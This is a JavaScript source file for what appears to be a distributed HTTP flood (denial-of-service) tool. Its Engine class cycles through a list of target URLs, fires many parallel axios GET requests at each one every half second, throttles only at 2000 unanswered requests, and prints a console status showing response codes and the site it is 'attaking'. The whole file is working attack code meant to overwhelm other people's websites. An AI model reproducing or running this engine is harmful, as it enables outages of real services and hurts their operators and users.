import ora from "ora";
import events from "events";
import axios from "axios";

import manualTargets from "../targets/targets.js";
import TargetsParser from "./TargetsParser.js";

events.EventEmitter.defaultMaxListeners = 15;

export default class Engine {
    constructor(argv = {}) {
        this.argv = argv;
        this.startTime = 0;
        this.timeElapsed = 0;
        this.totalTime = argv.time;
        this.lastFrame = 0;
        this.deltaTime = 0;
        this.pauseTime = 0;
        this.nextCall = {};
        this.targets = [];
        this.codes = [];
        this.responses = 0;
        this.requests = 0;

        this.updated = false;
        this.paused = false;

        this.start();
    }

    async start() {
        this.spinner = ora("Getting targets...").start();
        await this.getTargets();

        this.startTime = Date.now();
        this.timeElapsed = Date.now() - this.startTime;
        this.lastFrame = Date.now();
        this.render();
    }

    async getTargets () {
        this.targets = manualTargets.slice();
        if (this.argv.targets) {
            this.targets = this.targets.concat(await TargetsParser.getAllTargets());
        }
    }

    async updateTargets () {
        this.paused = true;
        this.updated = true;
        this.fillCode();
        this.targets = manualTargets.slice();
        if (this.argv.targets) {
            this.targets = this.targets.concat(await TargetsParser.getAllTargets());
        }
        this.updated = false;
    }

    render(delta = 0) {
        if (!this.paused) {
            this.timeElapsed = Date.now() - this.startTime - this.pauseTime;
            this.deltaTime = Date.now() - this.lastFrame;
            this.lastFrame = Date.now();
        } else {
            this.pauseTime += delta;
        }
        this.enterFrame();
        let timeout = setTimeout(() => {
            this.render(this.deltaTime);
            clearTimeout(timeout);
        }, 100);
    }

    enterFrame () {
        if (this.requests - this.responses >= 2000) {
            this.paused = true;
        }
        if (!this.paused && this.everyTimeElapsed(500)) {
            this.attack();
            this.fillCode();
            if (this.everyTimeElapsed(this.argv.targetsRefresh)) {
                //this.updateTargets();
            }
        } else if (this.paused && this.requests === this.responses) {
            this.paused = false;
            this.fillCode();
        }

    }

    attack () {
        let url = this.url = this.getNextUrl();
        for (let i = this.argv.streams; i--;) {
            this.requests++;
            const controller = new AbortController();
            axios({
                url,
                timeout: this.argv.timeout,
                signal: controller.signal
            })
                .then((response) => {
                    if (response.status) {
                        this.fillCode(Number(response.status));
                    }
                })
                .catch((error) => {
                    if (error.response && error.response.status) {
                        this.fillCode(error.response.status);

                    } else {
                        this.fillCode('error');
                    }
                })
                .then(() => {
                    this.responses++;
                    controller.abort();
                });
        }
    }

    everyTimeElapsed (period) {
        if (!this.nextCall[period]) {
            this.nextCall[period] = period;
        }

        if (this.timeElapsed >= this.nextCall[period]) {
            this.nextCall[period] = this.nextCall[period] + period;
            return true;
        }

        return false;
    }

    getNextUrl() {
        if (this.targets.length) {
            let res = this.targets.shift();
            this.targets.push(res);
            return res;
        }
        return "";
    }

    fillCode(statusCode = "") {
        if (statusCode === "") return;

        let string = "";
        if (this.codes[statusCode] === undefined) {
            this.codes[statusCode] = 1;
        } else if (statusCode) {
            this.codes[statusCode] += 1;
        }

        string += "\r\n----- Status stat -----\r\n";
        for (let key in this.codes) {
            string += `${key}: ${this.codes[key]} \r\n`
        }
        string += "\r\n----- Requests stat -----\r\n";
        string += `targets: ${this.targets.length} | `;
        string += `req: ${this.requests} | `;
        string += `res: ${this.responses} \r\n`;
        string += "\r\n----- State -----\r\n";

        if (!this.paused) {
            string += `Attaking: ${this.url}\r\n`;
        } else if (this.updated) {
            string += `Updating targets...\r\n`;
        } else if (this.paused) {
            string += `Waiting...\r\n`;
        };

        string += "\r\n----- Time -----\r\n";
        if (this.totalTime > 0) {
            string += `time: ${this.msToTime(this.timeElapsed)} (${this.msToTime(this.totalTime)})`;
        } else {
            string += `time: ${this.msToTime(this.timeElapsed)}`;
        }

        this.spinner.text = string;

        if (this.totalTime > 0 && this.timeElapsed > this.totalTime && this.responses >= this.requests) {
            this.spinner.succeed("Done!");
        }
    }

    msToTime(duration) {
        var milliseconds = parseInt((duration % 1000) / 100),
            seconds = Math.floor((duration / 1000) % 60),
            minutes = Math.floor((duration / (1000 * 60)) % 60),
            hours = Math.floor((duration / (1000 * 60 * 60)) % 24);

        hours = (hours < 10) ? "0" + hours : hours;
        minutes = (minutes < 10) ? "0" + minutes : minutes;
        seconds = (seconds < 10) ? "0" + seconds : seconds;

        return hours + ":" + minutes + ":" + seconds + "." + milliseconds;
    }
}